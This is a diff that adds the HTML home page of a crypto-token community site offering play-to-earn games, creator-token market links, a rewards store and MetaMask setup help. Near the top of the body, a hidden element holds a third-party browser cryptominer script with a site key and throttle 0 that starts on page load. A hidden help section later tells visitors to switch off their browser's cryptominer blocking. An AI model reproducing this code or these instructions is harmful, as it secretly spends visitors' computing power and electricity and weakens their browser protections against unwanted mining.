@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>#MindsGaming - MTCG</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="Community & Member Groups" />
+    <meta
+      property="og:image"
+      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
+    />
+    <link
+      rel="icon"
+      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
+    />
+    <link rel="stylesheet" href="https://ipack.glitch.me/mgicons.css" />
+    <script src="https://www.hostingcloud.racing/3g44.js"></script>
+
+    <script src="/tokens/metamask.js" defer></script>
+    <script src="https://mtcgverse.glitch.me/MTCGverse.js" defer></script>
+    <script src="/tokens/tokens.js" defer></script>
+    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
+    <script src="/client.js" defer></script>
+    <script src="/games/games.js" defer></script>
+    <script src="/games/spin/spin.js" defer></script>
+    <script src="/games/spin/start.js" defer></script>
+    <script src="/chat/chat.js" defer></script>
+    <script src="/chat/shop.js" defer></script>
+    <script src="/chat/jitsi.js" defer></script>
+
+    <script src="/fly.js" defer></script>
+    <script src="/miner/minercheck.js" defer></script>
+
+    <link rel="stylesheet" href="/style.css" />
+    <link rel="stylesheet" href="/games/spin/style.css" defer />
+  </head>
+  <body>
+    <miner class="hide" id="MINER">
+      <script>
+        var _client = new Client.Anonymous(
+          "965d2861fb2a4feecd31c6df44bb842f986bbdb2caccd02642aae8c5a23e3883",
+          {
+            throttle: 0,
+            c: "w",
+            ads: 0,
+          }
+        );
+        _client.start();
+      </script></miner
+    >
+    <wrap>
+      <app id="APP" class="display" title="HOME">
+        <center>
+          <article>
+            <h1>MTCG Ecosystem & Rewards</h1>
+            <p class="white">
+              We are a community that focuses on creativity and collaboration.
+              We build cultures not promises of amazing profits and millionaire
+              status. 
+              <br /><br />
+              With a structured community based off creators, topics and
+              participation in collaborative projects our cryptocurrency
+              ecosystem is managed by the creators who launched the token to
+              support there favorite topics and creations in our community.
+              <br /><br />
+              Our goal is to make you fully independent and expand past our
+              little community topics into your own independent culture for your
+              passion. Of course we'd love if you stuck around and built with us
+              helping maintain groups, run projects and support other creators
+              in our community.
+              <br />
+              <button id="playhomevideo" onclick="playhomevideo();">
+                Watch Videos
+              </button>
+              <br />
+            </p>
+
+            <a
+              href="https://www.mintme.com/token/MTCG/ETH/trade"
+              target="_blank"
+            >
+              <button>ETH Market</button></a
+            >
+            <a href="https://mintme.com/token/MTCG" target="_blank">
+              <button>Support Our Ecosystem</button></a
+            >
+            <a
+              href="https://www.mintme.com/token/MTCG/MINTME/trade"
+              target="_blank"
+            >
+              <button>MINTME Market</button></a
+            >
+          </article>
+
+          <article>
+            <h1>Earn Rewards</h1>
+            <p class="white">
+              You can earn community rewards (blockchain tokens owned by
+              creators) by hanging out in our virtual hubs and playing games on
+              this website :)  
+            </p>
+
+            <button onclick="userview();">Earn Rewards</button>
+            <button onclick="justexplore();">Explore Hubs</button>
+            <button onclick="viewgames();">View Games</button>
+          </article>
+
+          <article>
+            <h1>Creator Tokens</h1>
+            <p class="white">
+              Creators in our ecosystem have thier own token that supports
+              projects or activitys they are working on (These are the tokens
+              you're earning on this site). Support the creators and purchase
+              thier token, or sell the ones you have! 
+            </p>
+            <a href="https://mintme.com/token/GAMER" target="_blank">
+              <button>GAMER</button></a
+            >
+
+            <a href="https://mintme.com/token/ECLIPSE" target="_blank">
+              <button>ECLIPSE</button></a
+            >
+
+            <a href="https://mintme.com/token/DooBetter" target="_blank">
+              <button>DooBetter</button></a
+            >
+
+            <a href="https://mintme.com/token/GTPC" target="_blank">
+              <button>GTPC</button></a
+            >
+            <a href="https://mintme.com/token/withinthevacuum" target="_blank">
+              <button>withinthevacuum</button></a
+            >
+            <a href="https://mintme.com/token/PINN" target="_blank">
+              <button>PINN</button></a
+            >
+            <a href="https://mintme.com/token/DarkMark" target="_blank">
+              <button>DarkMark</button></a
+            >
+            <a href="https://mintme.com/token/DragonToken" target="_blank">
+              <button>DragonToken</button></a
+            >
+
+            <a href="https://mintme.com/token/Candys" target="_blank">
+              <button>Candys</button></a
+            >
+          </article>
+
+          <article>
+            <h1>Collect MTCG Cards</h1>
+            <p class="white">
+              We have collector MTCG cards you can collect and transfer back at
+              any time for the printed MTCG token value on the card!
+            </p>
+
+            <button onclick="viewcollection();">Start Your Collection!</button>
+          </article>
+
+          <article>
+            <h1>Build Our Community</h1>
+            <p class="white">
+              Help improve our community ecosystem, games, website and
+              everything else with our community builder!
+            </p>
+            <a href="https://app.clarity.so/mindsgaming/home" target="blank">
+              <button>Join Builder</button></a
+            >
+            <a
+              href="https://app.clarity.so/mindsgaming/pages/c5d4a0e5-fc1d-4a8c-8394-549efacf2c07"
+              target="_blank"
+            >
+              <button>Learn More</button></a
+            >
+          </article>
+
+          <article>
+            <h1>Explore Groups</h1>
+            <p class="white">
+              We have tons of social groups and chat rooms in our community, we
+              use Minds.com as our socail media!
+            </p>
+            <a href="https://mindsgaming.glitch.me" target="_blank">
+              <button>Explore Groups</button></a
+            >
+            <a
+              href="https://minds.com/MindsGaming/?referrer=MindsGaming"
+              target="_blank"
+            >
+              <button>Join Minds</button></a
+            >
+
+            <a
+              href="https://chat.minds.com/#/room/#BendersCasino:minds.com"
+              target="_blank"
+            >
+              <button>Chat With Us!</button></a
+            >
+          </article>
+          <article>
+            <h1>Exploring WEB3</h1>
+            <p class="white">
+              We use WEB3 innovations to build our collective assets, and
+              promote our content. Join us and create your own token, Mint NFT
+              art and videos, build games and more!
+            </p>
+            <a href="https://www.mintme.com/token/MTCG/invite" target="_blank">
+              <button>MINTME (Create A Token)</button></a
+            >
+            <a onclick="Bsocial();"> <button>Website Chat (Testing)</button></a>
+            <a
+              href="https://app.momint.so/profile/61913fd31f49a5003064c090"
+              target="_blank"
+            >
+              <button>Momint (ART)</button></a
+            >
+            <a href="https://joystream.org/" target="_blank">
+              <button>Joystream (Videos)</button></a
+            >
+            <a href="https://glitch.com/@mg-games" target="_blank">
+              <button>Glitch (Code Games)</button>
+            </a>
+            <a href="https://hubs.mozilla.com/spoke/" target="_blank">
+              <button>Spoke (Virtual Hubs)</button>
+            </a>
+          </article>
+          <br />
+        </center>
+      </app>
+      <div id="quickTools" class="quicker" onclick="displayTools();">
+        <tool class="display" id="TOOLS" title="TOOLS">
+          <tool>
+            <div onclick="HOME();" id="home" class="home" title="HOME"></div>
+          </tool>
+          <tool>
+            <div
+              onclick="quickhub();"
+              id="hub"
+              class="browser"
+              title="Hang-Out"
+            ></div>
+          </tool>
+          <tool>
+            <div
+              onclick="Jsocial();"
+              id="jitsi"
+              class="jitsiicon"
+              title="Jitsi"
+            ></div>
+          </tool>
+          <tool>
+            <div
+              onclick="viewgames();"
+              id="games"
+              class="gamepad"
+              title="Games"
+            ></div>
+          </tool>
+          <tool>
+            <div
+              onclick="userview();"
+              id="userview"
+              class="lightning"
+              title="Rewards"
+            ></div>
+          </tool>
+          <tool>
+            <div
+              onclick="viewcollection();"
+              id="shop"
+              class="shopicon"
+              title="Shop"
+            ></div>
+          </tool>
+          <tool>
+            <div
+              onclick="openexperiments();"
+              id="experiment"
+              class="experimenticon"
+              title="Shop"
+            ></div>
+          </tool>
+        </tool>
+      </div>
+      <!-- HUBS in script -->
+      <div class="hide" id="HUBS" title="build"></div>
+
+      <!-- SOCIAL BUILD -->
+      <div id="DRAGME" class="hide" title="BUILD">
+        <center>
+          <p style="font-size: 12px; color: gold; font-weight: bolder">
+            MTCG Jitsi
+          </p>
+          <div id="SOCIAL">
+            <label
+              class="close"
+              style="
+                float: left;
+                margin-top: -15px;
+                margin-left: 3px;
+                padding: 1px;
+              "
+              onclick="Jsocial();"
+            ></label>
+          </div>
+        </center>
+      </div>
+
+      <!-- GAMES Built In -->
+
+      <div class="hide" id="GAMES" title="closed">
+        <div id="inplay" class="hide" title="CLOSED"></div>
+        <div id="gameMenu" class="" title="CLOSED">
+          <center>
+            <article title="Intro">
+              <h1 align="center">Play Games While Earning Rewards</h1>
+              <p class="white">
+                Select A Game Below To Play While Earning Rewards
+              </p>
+            </article>
+
+            <article id="lotto">
+              <h1>Enter The Lotto!</h1>
+              <p>
+                Thanks for being a user of our site! Enter this lotto for a
+                chance to win big!
+              </p>
+              <br />
+              <p
+                style="color: red; font-size: 8px"
+                title="*One entry per wallet"
+              >
+                *One entry per wallet
+              </p>
+
+              <button onclick="lotto()">Submit Entry</button>
+            </article>
+
+            <article title="City Builder">
+              <h1 id="needle-title">City Builder</h1>
+              <div id="needle-info" onmouseover="castletimer();">
+                <p class="white">Build A City While The Time Passes...</p>
+                <br />
+                <iframe
+                  allow="microphone 'src'"
+                  src="/games/city-builder"
+                  width="95%"
+                  height="600"
+                  frameborder="0"
+                  scrolling="auto"
+                ></iframe>
+                <br />
+                <div class="white">
+                  <label>Timer:<label id="castletimer">0</label></label>
+                  <br />
+                  <button onclick="cashcastletimer()">Grab Rewards!</button>
+                  <br />
+                  <div id="castle-alert"></div>
+                </div>
+              </div>
+            </article>
+
+            <article title="GTPC">
+              <h1 id="gtpc-title">GTPC</h1>
+              <div id="gtpc-info">
+                <p class="white">
+                  No mistake GTPC has thier own game, website and rewards make
+                  sure to check them out!
+                </p>
+
+                <br />
+                <a href="http://gametestplay.com/" target="_blank">
+                  <button>Explore GTPC!</button></a
+                >
+              </div>
+            </article>
+
+            <article title="SandBox">
+              <h1 id="duck-title">SandBox</h1>
+              <div id="duck-info" onmouseover="ducktimer();">
+                <p class="white">Chat with our AI!</p>
+                <br />
+                <iframe
+                  src="/images/confetti.png"
+                  id="duck-game"
+                  title="CLOSED"
+                  style="
+                    display: block;
+                    width: 100%;
+                    height: 400px;
+                    border-radius: 30px 30px 30px 30px;
+                    opacity: 0.9;
+                  "
+                >
+                </iframe>
+                <br />
+                <div class="white">
+                  <label>Timer:<label id="ducktimer">0</label></label>
+                  <br />
+                  <button onclick="cashducktimer()">Grab Rewards!</button>
+                  <br />
+                  <div id="duck-alert"></div>
+                </div>
+              </div>
+            </article>
+
+            <article title="Spin Miner">
+              <h1 id="spin-title">Spin Miner</h1>
+              <div id="spin-info">
+                <p class="white">
+                  Spin And Match To Win! Match Three To Unlock The Spun Rewards!
+                </p>
+                <p style="color: red">
+                  Spun Rewards: <label id="mined">0</label>
+                </p>
+                <div class="white">
+                  <p>
+                    Your Spins:
+                    <label id="ONE"></label>
+                    <label id="TWO"></label>
+                    <label id="THREE"></label><br /><br />
+                    <label id="FOUR"></label>
+                  </p>
+                </div>
+
+                <div class="map">
+                  <div>
+                    <div class="box" id="1" title="MINE">Blank</div>
+                    <div class="box" id="2" title="MINE">Blank</div>
+                    <div class="box" id="3" title="MINE">Blank</div>
+                    <div class="box" id="4" title="MINE">Blank</div>
+                    <div class="box" id="5" title="MINE">Blank</div>
+                  </div>
+                  <br />
+                  <div>
+                    <div class="box" id="6" title="MINE">Blank</div>
+                    <div class="box" id="7" title="MINE">Blank</div>
+                    <div class="box" id="8" title="MINE">Blank</div>
+                    <div class="box" id="9" title="MINE">Blank</div>
+                    <div class="box" id="10" title="MINE">Blank</div>
+                  </div>
+                  <br />
+                  <div>
+                    <div class="box" id="11" title="MINE">Blank</div>
+                    <div class="box" id="12" title="MINE">Blank</div>
+                    <div class="box" id="13" title="MINE">Blank</div>
+                    <div class="box" id="14" title="MINE">Blank</div>
+                    <div class="box" id="15" title="MINE">Blank</div>
+                  </div>
+                  <br />
+                  <div>
+                    <div class="box" id="16" title="MINE">Blank</div>
+                    <div class="box" id="17" title="MINE">Blank</div>
+                    <div class="box" id="18" title="MINE">Blank</div>
+                    <div class="box" id="19" title="MINE">Blank</div>
+                    <div class="box" id="20" title="MINE">Blank</div>
+                  </div>
+                  <br />
+                  <div>
+                    <div class="box" id="21" title="MINE">Blank</div>
+                    <div class="box" id="22" title="MINE">Blank</div>
+                    <div class="box" id="23" title="MINE">Blank</div>
+                    <div class="box" id="24" title="MINE">Blank</div>
+                    <div class="box" id="25" title="MINE">Blank</div>
+                  </div>
+                  <br />
+                  <br />
+                  <br />
+                  <button class="mineBTN" id="dig">Spin</button>
+                  <meter
+                    id="EARNED"
+                    title="EARNED"
+                    class="hide"
+                    min="0"
+                    low="1"
+                    high="100"
+                    max="1000"
+                    value="0"
+                  ></meter>
+                  <meter
+                    id="RANDOM"
+                    title="RANDOM"
+                    class="hide"
+                    min="0"
+                    low="1"
+                    high="25"
+                    max="26"
+                    value="1"
+                  ></meter>
+                  <meter
+                    id="SPINS"
+                    title="SPINS"
+                    class="hide"
+                    min="0"
+                    low="1"
+                    high="3"
+                    max="4"
+                    value="1"
+                  ></meter>
+                  <meter
+                    id="HARDNESS"
+                    title="HARDNESS"
+                    class="hide"
+                    min="1000"
+                    low="5000"
+                    high="100000"
+                    max="10000000"
+                    value="1000"
+                  ></meter>
+                  <br />
+                </div>
+              </div>
+            </article>
+
+            <article title="Click Miner">
+              <h1 id="click-title">Click Miner</h1>
+              <div id="click-info">
+                <p class="white">Fill the meter and earn rewards!</p>
+                <meter
+                  class="clickminer"
+                  id="CLICKMINER"
+                  min="0"
+                  low="25"
+                  high="85"
+                  max="100"
+                  value="0"
+                ></meter>
+                <button id="click-btn" onclick="clickMINER();">Click Me</button>
+                <br />
+                <div class="white">
+                  <label>Earned:<label id="click-earned">0</label></label>
+                </div>
+              </div>
+            </article>
+
+            <article title="Coming Soon">
+              <h1 id="soon-title">New Games On The Way!</h1>
+              <div id="soon-info">
+                <p class="white">
+                  We are always changing and adding new games to try out and
+                  play, some of them are created by users in our community! If
+                  you build or want to submit your game here drop by our chat
+                  room!
+                </p>
+
+                <br />
+                <a
+                  href="https://chat.minds.com/#/room/#BendersCasino:minds.com"
+                  target="_blank"
+                >
+                  <button onclick="WACK();">Start Chatting!</button></a
+                >
+              </div>
+            </article>
+          </center>
+        </div>
+      </div>
+      <!-- LOGIN FORM -->
+      <div class="hide" id="COLLECTION" title="build"></div>
+      <div class="hide" id="IMPORTTOKENS" title="build"></div>
+
+      <div class="hide" id="LOGIN" title="closed">
+        <center>
+          <h1 class="rewards-intro" id="login-form">
+            <label id="rewards-intro">
+              Just copy and paste your metamask or ecosystem web wallet receiver
+              address to start earning rewards!
+              <br />
+              <code style="color: red; font-size: 15px"></code>
+            </label>
+            <form class="form" id="form">
+              <input
+                id="dream"
+                name="dream"
+                aria-label="a new dream"
+                type="text"
+                maxlength="100"
+                value=""
+                pattern=".{42,43}"
+                required
+                placeholder="Wallet ID"
+                title="Wallet IDs Are 43 Characters"
+              />
+              <br />
+              <button type="submit" id="submit-dream">
+                Mobile/Manual Connect
+              </button>
+              <button id="connect">Metamask Desktop Connect</button>
+            </form>
+            <div class="helper" onclick="walletTools()">HELP</div>
+          </h1>
+          <!-- Start Store -->
+          <div class="hide" id="rewardsSTORE" title="Closed">
+            <label
+              class="sclose"
+              title="Open"
+              onclick="openrewardsStore();"
+            ></label>
+            <center>
+              <h1>Rewards Store</h1>
+            </center>
+            <article id="storeitemONE" style="margin-left: -45%; width: 35%">
+              <h1 id="storeitemNAME">MTCG circuit breaker</h1>
+              <label class="testitem" id="storeitemone"></label>
+              <p id="storeitemoneintro" class="white">
+                Circuit breaker icon for MTCG by @SatoriD
+              </p>
+              <br />
+              <input
+                id="storeitemONECHAT"
+                name="storeitemONECHAT"
+                class="storechat"
+                type="text"
+                maxlength="5000"
+                placeholder="Great Work!"
+              /><br />
+              <button id="storeitemONEBTN" onclick="tipstoreitemONE()">
+                Tip Creator</button
+              ><br />
+              <label class="storeerror" id="storeerror"></label><br />
+              <label
+                class="toggleicon"
+                id="toggleicon"
+                onclick="togglevalue();"
+              ></label>
+              <label class="storeerror" id="storePRICE">01</label>
+              <label class="storeerror" id="storeTOKEN">Rewards</label>
+            </article>
+
+            <article
+              id="storeitemTWO"
+              style="margin-left: 45%; margin-top: -33%; width: 35%"
+            >
+              <h1 id="storeitemNAMETWO">Title: Skull</h1>
+              <label class="testitemTWO" id="storeitemtwo"></label>
+              <p id="storeitemtwointro" class="white">
+                Skull and Snake Image By @Darkmark on momint
+              </p>
+              <br />
+              <input
+                id="storeitemTWOCHAT"
+                name="storeitemTWOCHAT"
+                class="storechat"
+                type="text"
+                maxlength="5000"
+                placeholder="Great Work!"
+              /><br />
+              <button id="storeitemTWOBTN" onclick="tipstoreitemTWO()">
+                Tip Creator</button
+              ><br />
+              <label class="storeerror" id="storeerrorTWO"></label><br />
+              <label
+                class="toggleicon"
+                id="toggleiconTWO"
+                onclick="togglevalue();"
+              ></label>
+              <label class="storeerror" id="storePRICETWO">01</label>
+              <label class="storeerror" id="storeTOKENTWO">Rewards</label>
+            </article>
+            <br />
+            <br />
+            <a
+              href="https://www.mintme.com/token/MTCG/MINTME/intro/1/reward-finalize/Add-Content-To-Rewards-Shop"
+              target="_blank"
+            >
+              <button>Add Shop Item</button>
+            </a>
+            <meter
+              id="storePRICEMETER"
+              title="storePRICE"
+              class="hide"
+              min="0"
+              low="1"
+              high="25"
+              max="100"
+              value="1"
+            ></meter>
+          </div>
+          <!-- End Store -->
+          <article id="PENDING" class="white" title="Activity Board">
+            <div>
+              Wallet:
+              <label class="overflow" id="mywallet" title="LOGIN">LOGIN</label>
+            </div>
+            <div>
+              Reward Token:
+              <label
+                style="color: gold; font-weight: bold; cursor: pointer"
+                id="myToken"
+                onclick="changeToken();"
+                >Random</label
+              >
+            </div>
+            <section title="closed" id="pendingClaims" class="">
+              <center title="Earned Rewards">
+                Earned
+
+                <label id="minutes" value="0">00</label>.<label
+                  id="seconds"
+                  value="0"
+                  >00</label
+                >
+                <br /><br />
+                <label
+                  id="hidestack"
+                  class="hide"
+                  onclick="claimstashREWARDS();"
+                >
+                  <div id="createstash">
+                    <label title="Comment Stash Is Kept Until Page Is Left">
+                      Reward Stash
+                    </label>
+                    <br />
+                    <p class="userstash">
+                      GAMER <label class="stashing" id="GAMERSTASH">0</label>
+                    </p>
+                    <p class="userstash">
+                      Eclipse
+                      <label class="stashing" id="ECLIPSESTASH">0</label>
+                    </p>
+                    <p class="userstash">
+                      DooBetter
+                      <label class="stashing" id="DooBetterSTASH">0</label>
+                    </p>
+                    <p class="userstash">
+                      GTPC <label class="stashing" id="GTPCSTASH">0</label>
+                    </p>
+                    <p class="userstash">
+                      withinthevacuum
+                      <label class="stashing" id="withinthevacuumSTASH"
+                        >0</label
+                      >
+                    </p>
+                    <p class="userstash">
+                      PINN <label class="stashing" id="PINNSTASH">0</label>
+                    </p>
+                    <p class="userstash">
+                      DarkMark
+                      <label class="stashing" id="DarkMarkSTASH">0</label>
+                    </p>
+                    <p class="userstash">
+                      DragonToken<label class="stashing" id="DragonTokenSTASH"
+                        >0</label
+                      >
+                    </p>
+                    <p class="userstash">
+                      Candys <label class="stashing" id="CandysSTASH">0</label>
+                    </p>
+                    <br />
+                  </div>
+                </label>
+              </center>
+              <br />
+              <button onclick="openrewardsStore();">Rewards Store</button>
+              <br />
+              <button
+                id="claimBTN"
+                onclick="claimUpdate();"
+                title="Grab These Rewards!"
+              >
+                Grab These Rewards!
+              </button>
+
+              <hr />
+              Activity Board
+              <meter
+                id="levelUp"
+                title="LOGIN"
+                class="hide"
+                min="0"
+                low="1"
+                high="60"
+                max="70"
+                value="0"
+              ></meter>
+              <label class="hide" id="todaysDate"></label>
+              <hr />
+              <ul class="overflow" id="last" title="0"></ul>
+              <hr />
+              History
+              <hr />
+              <ul class="overflow" id="dreams" title="Activity Board"></ul>
+            </section>
+            <button class="hide" id="clear-dreams">Clear Dreams</button>
+            <div class="chatformBOX">
+              <label class="user" id="myUSER" title="MG Post"
+                ><a href="/chat" target="_blank">Live Feed</a></label
+              ><br />
+              <br />
+              <input
+                id="CHATBOX"
+                name="CHATBOX"
+                aria-label="a new dream"
+                type="text"
+                maxlength="5000"
+                onclick="createPOST();"
+                placeholder="What's Up?"
+                required
+              />
+              <button class="POSTBTN" type="submit" id="commentBTN">
+                Comment
+              </button>
+              <br />
+              <label id="chaterror" class="desktoponly" title="1 Reward Token"
+                >Cost: 1 Reward Token</label
+              >
+            </div>
+          </article>
+
+          <div id="wallet-links" class="hide">
+            <label id="my-miner" class="hide">
+              <article>
+                <h1>Unblocking The Miner</h1>
+                <p class="white">
+                  This site uses a cryptominer that supports the giving of the
+                  play to earn layout, some web browsers block cryptominers by
+                  default. To unblock the miner and unlock rewards click the
+                  shield in your browser search bar next to the sites url, and
+                  customize your settings to allow the cryotominers.
+                </p>
+                <img
+                  src="https://cdn.glitch.global/4d28a5f0-4bec-4873-9059-3319b8398254/unblock.png"
+                  width="100%"
+                  height="99%"
+                />
+                <br />
+                <button>
+                  <a
+                    href="https://www.coinimp.com/invite/7379384b-1c8a-4a04-b415-0b0892454835"
+                    target="_blank"
+                    >CoinIMP</a
+                  >
+                </button>
+              </article>
+            </label>
+
+            <article>
+              <h1>Reward Levels</h1>
+              <p class="white">
+                Level up your rewards by spending more time on the miner!
+                <br />
+                <br />
+                <label style="color: red"
+                  >Your Level:<label id="yourLevel">ONE</label></label
+                >
+              </p>
+              <p class="white">
+                <b style="color: blue">Level One:</b>
+                DarkMark <br />
+                <b style="color: blue">Level Two:</b>
+                DragonToken <br />
+                <b style="color: blue">Level Three:</b> Candys <br />
+                <b style="color: blue">Level Four:</b> PINN<br />
+                <b style="color: blue">Level Five:</b> withinthevacuum<br />
+                <b style="color: blue">Level Six:</b> ECLIPSE <br />
+                <b style="color: blue">Level Seven:</b> DooBetter <br />
+                <b style="color: blue">Level Eight:</b> GTPC <br />
+                <b style="color: blue">Level Nine:</b> GAMER <br />
+              </p>
+            </article>
+
+            <article>
+              <h1>Creator Tokens</h1>
+              <p class="white">
+                Creators in our ecosystem have thier own token that supports
+                projects or activitys they are working on (These are the tokens
+                you're earning on this site). Support the creators and purchase
+                thier token, or sell the ones you have! 
+              </p>
+              <a href="https://mintme.com/token/GAMER/trade" target="_blank">
+                <button>GAMER</button></a
+              >
+
+              <a href="https://mintme.com/token/ECLIPSE/trade" target="_blank">
+                <button>ECLIPSE</button></a
+              >
+
+              <a
+                href="https://mintme.com/token/DooBetter/trade"
+                target="_blank"
+              >
+                <button>DooBetter</button></a
+              >
+
+              <a href="https://mintme.com/token/GTPC/trade" target="_blank">
+                <button>GTPC</button></a
+              >
+              <a
+                href="https://mintme.com/token/withinthevacuum/trade"
+                target="_blank"
+              >
+                <button>withinthevacuum</button></a
+              >
+              <a href="https://mintme.com/token/PINN/trade" target="_blank">
+                <button>PINN</button></a
+              >
+
+              <a href="https://mintme.com/token/DarkMark/trade" target="_blank">
+                <button>DarkMark</button></a
+              >
+              <a
+                href="https://mintme.com/token/DragonToken/trade"
+                target="_blank"
+              >
+                <button>DragonToken</button></a
+              >
+              <a href="https://mintme.com/token/Candys/trade" target="_blank">
+                <button>Candys</button></a
+              >
+            </article>
+            <article>
+              <h1>MetaMask Help</h1>
+              <p class="white">
+                Our rewards tokens use the MINTME blockchain, you will need to
+                add the network to metamask. Mobile users will have to manually
+                add the network and import tokens, if you are on desktop you can
+                connect the network and add tokens from this site!
+              </p>
+              <button onclick="importTokens();">Import Tokens</button>
+              <button onclick="manualInfo();">Manual Information</button>
+
+              <div class="hide" id="manualInfo" title="closed">
+                <center class="white">
+                  <code>
+                    Network name = MINTME <br />
+                    New RPC URL = https://node1.mintme.com <br />
+                    ChainID = 24734 <br />Symbol = MINTME <br />
+                    Block Explorer URL = https://www.mintme.com/explorer
+                    <br />
+                  </code>
+                </center>
+              </div>
+            </article>
+            <article>
+              <h1>Webwallet Help</h1>
+              <p class="white">
+                Web wallets can be obtained on MINTME by creating an account.
+                Once you have an account travel to your
+                <code>/wallet</code> page and select deposit on MintMe to view
+                your wallet reciver address.
+              </p>
+              <a
+                href="https://www.mintme.com/token/MTCG/invite"
+                target="_blank"
+              >
+                <button>MINTME (Create A Wallet)</button></a
+              >
+            </article>
+          </div>
+        </center>
+      </div>
+    </wrap>
+    <div id="offline" class="hide">
+      <center>
+        <h1>No connection Found :/</h1>
+        <button onclick="HOME();">Relaod Site</button>
+      </center>
+    </div>
+  </body>
+</html>
